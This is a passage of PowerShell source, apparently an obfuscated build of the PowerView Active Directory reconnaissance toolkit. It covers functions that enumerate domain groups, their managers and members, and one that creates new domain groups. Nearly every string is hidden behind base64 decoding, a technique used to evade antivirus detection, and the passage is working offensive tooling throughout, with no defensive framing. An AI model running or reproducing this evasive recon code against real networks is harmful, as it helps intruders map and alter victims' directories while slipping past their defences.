                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
                    $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    $GroupScopeValue = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = Switch ($GroupScopeValue) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))            { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARwBsAG8AYgBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGkAdgBlAHIAcwBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    $GroupPropertyValue = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    $Filter = Switch ($GroupPropertyValue) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))              { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))          { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }
                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA=')))
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}
function New-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments
    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)
        $Group.SamAccountName = $Context.Identity
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            $Group.Description = $Description
        }
        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
            $Group
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}
function Get-DomainManagedSecurityGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZABCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            $GroupManager = Get-DomainObject @SearcherArguments
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $GroupManager.distinguishedName
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
            }
            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ACLArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $ManagedGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            $ManagedGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQBHAHIAbwB1AHAA'))))
            $ManagedGroup
        }
    }
}
function Get-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ADNameArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                $Group = Get-DomainGroup @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                    $GroupFoundDN = $Group.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA'))))
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
